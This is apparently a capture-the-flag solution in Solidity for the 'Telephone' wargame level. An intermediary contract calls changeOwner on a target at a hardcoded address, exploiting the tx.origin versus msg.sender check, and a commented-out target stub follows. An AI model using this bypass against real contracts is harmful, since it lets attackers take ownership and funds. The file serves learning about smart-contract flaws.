// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "./Telephone.sol";

contract HackTelephone {
    Telephone telephone = Telephone(0xdaBFc64410CEF846a9A74a0875A4dEb9599b8F91); /* Contract address here */

    function changeOwner(address _owner) public {
        telephone.changeOwner(_owner);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

contract Telephone {

//   address public owner;

//   constructor() public {
//     owner = msg.sender;
//   }

  function changeOwner(address _owner) public {
    // if (tx.origin != msg.sender) {
    //   owner = _owner;
    // }
  }
}